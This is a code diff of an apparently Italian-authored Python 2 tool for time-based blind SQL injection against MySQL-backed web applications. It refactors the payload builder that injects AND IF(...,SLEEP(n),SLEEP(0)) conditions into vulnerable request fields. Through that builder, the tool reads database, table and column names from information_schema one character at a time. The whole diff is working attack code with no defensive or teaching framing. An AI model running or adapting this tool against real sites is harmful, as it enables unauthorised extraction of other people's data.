@@ -20,25 +20,29 @@ NO_SUFF = 0
 COMMENT_SUFF = 1
 AND_SUFF = 2
 
+QUERY_TYPE_COUNT = 0
+QUERY_TYPE_LENGTH = 1
+QUERY_TYPE_VALUE = 2
+
 verbose = 0
 log = 0
 LOG_FILE_NAME = 'time_based.log'
 
 # MySQL DB Tables #
-INFORMATION_SCHEMA_DB_NAME = 'information_schema'
+INFORMATION_SCHEMA_DB_NAME = 'information_schema' # Nome del db che mantiene le info su DB, tabelle e colonne
 
-INF_SCHEMA_SCHEMATA = 'SCHEMATA'
-INF_SCHEMA_SCHEMATA_SCHEMA_NAME = 'SCHEMA_NAME' # Nome del db
+INF_SCHEMA_SCHEMATA = 'SCHEMATA' # Tabella con i nomi di tutti i DB
+INF_SCHEMA_SCHEMATA_SCHEMA_NAME = 'SCHEMA_NAME' # Colonna della tabella SCHEMATA con il nome di tutti i DB
 
-INF_SCHEMA_TABLES = 'TABLES'
+INF_SCHEMA_TABLES = 'TABLES' # Tabella dove stanno le info di tutte le tabelle di tutti i DB
 # used in where clause
-INF_SCHEMA_TABLES_TABLE_SCHEMA = 'TABLE_SCHEMA'
+INF_SCHEMA_TABLES_TABLE_SCHEMA = 'TABLE_SCHEMA' # Colonna di TABLES con il nome del DB a cui appartiene ogni tabella
+INF_SCHEMA_TABLES_TABLE_NAME = 'TABLE_NAME' # Colonna di TABLES con il nome della tabella
 
-INF_SCHEMA_TABLES_TABLE_NAME = 'TABLE_NAME'
-
-INF_SCHEMA_COLUMNS = 'COLUMNS'
-INF_SCHEMA_COLUMNS_TABLE_NAME = 'TABLE_NAME'
-INF_SCHEMA_COLUMNS_COLUMN_NAME = 'COLUMN_NAME'
+INF_SCHEMA_COLUMNS = 'COLUMNS' # Tabella dove si trovano tutti i nomi di tutte le colonne di tutti i DB
+INF_SCHEMA_COLUMNS_TABLE_NAME = 'TABLE_NAME' # Colonna di COLUMNS con il nome della tabella a cui appartiene ogni colonna
+INF_SCHEMA_COLUMNS_TABLE_SCHEMA = 'TABLE_SCHEMA' # Colonna di COLUMNS con il nome del DB a cui appartiene la tabella che contiene la colonna
+INF_SCHEMA_COLUMNS_COLUMN_NAME = 'COLUMN_NAME' # Colonna di COLUMNS con il nome della clolonna
 #########################
 
 
@@ -148,7 +152,6 @@ def measure_request_time(url, method, headers, cookies, data):
             t.join()
         return avg_time(times)
 
-
 # Valuta il tempo medio di risposta del server eseguendo
 # molte richieste (anche multiple), usato per calcolare lo sleep_time
 def evaluate_response_time(url, method, headers, cookies, data):
@@ -159,12 +162,14 @@ def evaluate_response_time(url, method, headers, cookies, data):
 
 # Valuta lo slee time da usare per le richieste
 def evaluate_sleep_time(response_time):
-    if response_time < 1:
-        return response_time * 10
-    elif response_time >= 1 and response_time < 2:
-        return response_time * 2
-    else:
-        return response_time
+	if response_time < 0.1:
+		return response_time * 10
+	elif response_time >= 0.1 and response_time < 1:
+		return response_time * 5
+	elif response_time >= 1 and response_time < 5:
+		return response_time
+	elif response_time > 5:
+		return response_time * 0.5
 
 # Determina quali dei campi passati al tool sono iniettabili e che ti di injection utilizzare ('-- -', '\' AND \'1\'=\'1', '')
 def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
@@ -205,26 +210,49 @@ def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
 
     return vuln_fields
 
+def build_where_predicate(where_params, where_values, where_conjunction, quote):
+	if quote != '':
+ 		return ''.join(['{}{}{}{}{} {} '.format(p, '=', quote, v, quote, where_conjunction) for (p, v) in zip(where_params, where_values)])[:-(2+len(where_conjunction))]
+ 	else:
+ 		return ''.join(['{}{}{}{}{} {} '.format(p, '=', 'CHAR(', string_to_int_list(v), ')', where_conjunction) for (p, v) in zip(where_params, where_values)])[:-(2+len(where_conjunction))]
+
+def build_query(query_type, vuln_type, table_name, where_params = '', where_values = '', where_conjunction = '', row_limit = ''):
+    where = ''
+    if where_params and where_values:
+        if vuln_type == NO_SUFF:
+            where = ' WHERE {}'.format(build_where_predicate(where_params, where_values, where_conjunction, ''))
+        elif vuln_type == COMMENT_SUFF or vuln_type == AND_SUFF:
+            where = ' WHERE {}'.format(build_where_predicate(where_params, where_values, where_conjunction, '\''))
+
+    query = ''
+    if query_type == QUERY_TYPE_COUNT:
+        query = 'SELECT COUNT(*) FROM %s'
+    elif query_type == QUERY_TYPE_LENGTH:
+        query = 'SELECT LENGTH({}) FROM %s'
+    elif query_type == QUERY_TYPE_VALUE:
+        query = 'SELECT ORD(MID({},{},1)) FROM %s '
+
+    query += where
+    if row_limit != '':
+        query += ' LIMIT %i,1' % row_limit
+
+    return query % table_name
+
+def build_sql_injection(query, operand, value, sleep_time, vuln_type):
+    if vuln_type == NO_SUFF:
+        return ' AND IF(({}){}{},SLEEP({}),SLEEP(0))'.format(query, operand, value, str(sleep_time))
+    elif vuln_type == COMMENT_SUFF:
+        return '{} AND IF(({}){}{},SLEEP({}),SLEEP(0)) {}'.format('\'', query, operand, value, str(sleep_time), SQL_SUFFIX_TYPE[COMMENT_SUFF])
+    elif vuln_type == AND_SUFF:
+        return '{} AND IF(({}){}{},SLEEP({}),SLEEP(0)) {}'.format('\'', query, operand, value, str(sleep_time), SQL_SUFFIX_TYPE[AND_SUFF])
 
 # Determina il numero di righe di una tabella del database
-def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, sleep_time, where_param = '', where_value = ''):
+def find_table_rows_count(url, method, headers, cookies, data, vuln_field,
+            vuln_type, db_name, table_name, sleep_time, where_params = '', where_values = '', where_conjunction = ''):
     m_data = data.copy()
-    table = db_name + '.' + table_name
-    sql_inj = ' AND IF(({})={},SLEEP({}),SLEEP(0))'
-    query = 'SELECT COUNT(*) FROM {}'
     file = ''
-
-    if vuln_type != NO_SUFF:
-        sql_inj = '\'' + sql_inj
-        if where_param:
-            query += ' WHERE {}=\'{}\''.format(where_param, where_value)
-        if vuln_type == COMMENT_SUFF:
-            sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
-        else:
-            sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
-    else:
-        if where_param:
-            query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))
+    m_table_name = '%s.%s' % (db_name, table_name)
+    query = build_query(QUERY_TYPE_COUNT, vuln_type, m_table_name, where_params, where_values, where_conjunction)
 
     if verbose:
         print '\nDeterminating number of rows of table: %s\n' % table_name
@@ -232,17 +260,17 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_
         file = open(LOG_FILE_NAME, 'a')
         file.write('\nDeterminating number of rows of table: %s\n\n' % table_name)
 
-    found = 0
+    found = False
     count = 0
     while not found:
-        m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(table), str(count), str(sleep_time))
+        m_data[vuln_field] = data[vuln_field] + build_sql_injection(query, '=', str(count), sleep_time, vuln_type)
         if verbose:
             print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
         if log:
             file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
         elapsed = measure_request_time(url, method, headers, cookies, m_data)
         if elapsed >= sleep_time:
-            found = 1
+            found = True
         else:
             count += 1
 
@@ -257,41 +285,24 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_
 
 # Determina il numero di caratteri di un campo del database
 def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
-                            db_name, table_name, column_name, sleep_time, limit_row = '',
-                                where_param = '', where_value = ''):
+                            db_name, table_name, column_name, sleep_time, row_limit = '',
+                                where_params = '', where_values = '', where_conjunction = ''):
     m_data = data.copy()
-    table = db_name + '.' + table_name
-    sql_inj = ' AND IF(({})={},SLEEP({}),SLEEP(0))'
-    query = 'SELECT LENGTH({}) FROM {}'
-    limit = ' LIMIT {},1'
     file = ''
+    m_table_name = '%s.%s' % (db_name, table_name)
 
-    if vuln_type != NO_SUFF:
-        sql_inj = '\'' + sql_inj
-        if where_param:
-            query += ' WHERE {}=\'{}\''.format(where_param, where_value)
-        if vuln_type == COMMENT_SUFF:
-            sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
-        else:
-            sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
-    else:
-        if where_param:
-            query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))
-
-    if limit_row != '':
-            query += limit.format(str(limit_row))
-
+    query = build_query(QUERY_TYPE_LENGTH, vuln_type, m_table_name, where_params, where_values, where_conjunction, row_limit)
     if verbose:
         print '\nDeterminating number of characters in the field: %s\n\n' % column_name
     if log:
         file = open(LOG_FILE_NAME, 'a')
         file.write('\nDeterminating number of characters in the field: %s\n\n' % column_name)
 
-    found = 0
+    found = False
     length = 0
     while not found:
         length += 1
-        m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, table), str(length), str(sleep_time))
+        m_data[vuln_field] = data[vuln_field] + build_sql_injection(query.format(column_name), '=', str(length), sleep_time, vuln_type)
         if verbose:
             print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
         if log:
@@ -300,7 +311,7 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
         if elapsed == -1:
             return -1
         if elapsed >= sleep_time:
-            found = 1
+            found = True
         if length > 255:
             return -1
 
@@ -313,29 +324,14 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
     return length
 
 # Determina il valore di un campo del database
-def find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, db_field_length, sleep_time, limit_row = '', where_param = '', where_value = ''):
+def find_data_val_binary(url, method, headers, cookies, data, vuln_field,
+            vuln_type, db_name, table_name, column_name, db_field_length,
+            sleep_time, row_limit = '', where_params = '', where_values = '', where_conjunction = ''):
     m_data = data.copy()
-    data_val = []
-    table = db_name + '.' + table_name
-    sql_inj = ' AND IF(({}){}{},SLEEP({}),SLEEP(0))'
-    query = 'SELECT ORD(MID({},{},1)) FROM {} '
-    limit = ' LIMIT {},1'
     file = ''
-
-    if vuln_type != NO_SUFF:
-        sql_inj = '\'' + sql_inj
-        if where_param:
-            query += ' WHERE {}=\'{}\''.format(where_param, where_value)
-        if vuln_type == COMMENT_SUFF:
-            sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
-        else:
-            sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
-    else:
-        if where_param:
-            query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))
-
-    if limit_row != '':
-            query += limit.format(str(limit_row))
+    data_val = []
+    m_table_name = '%s.%s' % (db_name, table_name)
+    query = build_query(QUERY_TYPE_VALUE, vuln_type, m_table_name, where_params, where_values, where_conjunction, row_limit)
 
     if verbose:
         print '\nDeterminating values of field: %s\n' % column_name
@@ -344,13 +340,11 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_t
         file.write('\nDeterminating values of field: %s\n\n' % column_name)
 
     for i in range(1, db_field_length + 1):
-        found = 0
-        low = 1
-        high = 128
-
+        found = False
+        low, high = 1, 128
         while not found:
             current = (low + high)//2
-            m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, str(i), table), '=', current, sleep_time)
+            m_data[vuln_field] = data[vuln_field] + build_sql_injection(query.format(column_name, str(i)), '=', current, sleep_time, vuln_type)
             if verbose:
                 print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
             if log:
@@ -359,11 +353,11 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_t
 
             if elapsed >= sleep_time:
                 data_val.append(chr(current))
-                found = 1
+                found = True
                 if verbose:
                     print '\nFound character: %c\n\n' % chr(current)
             else:
-                m_data[vuln_field] = data[vuln_field] + sql_inj.format(query.format(column_name, str(i), table), '>', current, sleep_time)
+                m_data[vuln_field] = data[vuln_field] + build_sql_injection(query.format(column_name, str(i)), '>', current, sleep_time, vuln_type)
                 if verbose:
                     print '{{{}: {}}}'.format(vuln_field, m_data[vuln_field])
                 if log:
@@ -383,9 +377,9 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_t
 
     return result
 
-def find_data(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, limit_row = '', where_param = '', where_value = ''):
-    length = find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, limit_row, where_param, where_value)
-    result = find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, length, sleep_time, limit_row , where_param, where_value)
+def find_data(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, row_limit = '', where_params = '', where_values = '', where_conjunction = ''):
+    length = find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, sleep_time, row_limit, where_params, where_values, where_conjunction)
+    result = find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, column_name, length, sleep_time, row_limit , where_params, where_values, where_conjunction)
     return result
 
 def main(argv):
@@ -470,8 +464,8 @@ def main(argv):
 
     # Cerco i nomi dei database #
     print '\nLooking for database names, please wait...'
-    rows_count = find_table_rows_count(url, method, headers, cookies, data,
-                    sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, sleep_time)
+
+    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, sleep_time)
     for i in range(rows_count):
         databases.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, INF_SCHEMA_SCHEMATA_SCHEMA_NAME, sleep_time, i))
         print 'Found: %s' % databases[i]
@@ -485,12 +479,12 @@ def main(argv):
 
     # Cerco le tabelle del database selezionato
     print 'Looking for tables in %s, please wait...\n' % db_name
-    where_param = INF_SCHEMA_TABLES_TABLE_SCHEMA
-    where_value = db_name
+    where_params = [INF_SCHEMA_TABLES_TABLE_SCHEMA]
+    where_values = [db_name]
 
-    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, sleep_time, where_param, where_value)
+    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, sleep_time, where_params, where_values)
     for i in range(rows_count):
-        tables.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, INF_SCHEMA_TABLES_TABLE_NAME, sleep_time, i, where_param, where_value))
+        tables.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, INF_SCHEMA_TABLES_TABLE_NAME, sleep_time, i, where_params, where_values))
     ###########################################
 
     # Seleziono una tabella #
@@ -500,11 +494,12 @@ def main(argv):
 
     # Cerco i nomi delle colonne nella tabella selezionata #
     print 'Looking for columns in %s, please wait...\n' % table_name
-    where_param = INF_SCHEMA_COLUMNS_TABLE_NAME
-    where_value = table_name
-    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_COLUMNS, sleep_time, where_param, where_value)
+    where_params = [INF_SCHEMA_COLUMNS_TABLE_NAME, INF_SCHEMA_COLUMNS_TABLE_SCHEMA]
+    where_values = [table_name, db_name]
+    where_conjunction = 'AND'
+    rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_COLUMNS, sleep_time, where_params, where_values, where_conjunction)
     for i in range(rows_count):
-        columns.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_COLUMNS, INF_SCHEMA_COLUMNS_COLUMN_NAME, sleep_time, i, where_param, where_value))
+        columns.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_COLUMNS, INF_SCHEMA_COLUMNS_COLUMN_NAME, sleep_time, i, where_params, where_values, where_conjunction))
 
     print columns
     ###########################################
